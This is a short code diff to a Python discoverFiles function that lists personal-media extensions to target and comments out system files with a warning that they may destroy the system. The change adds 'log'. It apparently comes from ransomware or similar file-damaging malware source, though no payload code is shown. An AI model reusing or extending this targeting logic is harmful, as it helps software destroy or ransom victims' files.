@@ -24,7 +24,7 @@ def discoverFiles(startpath):
     # This will not cover all files, but it should be a decent range.
     extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
-        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
+        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'log', # images
         'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
         'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
 
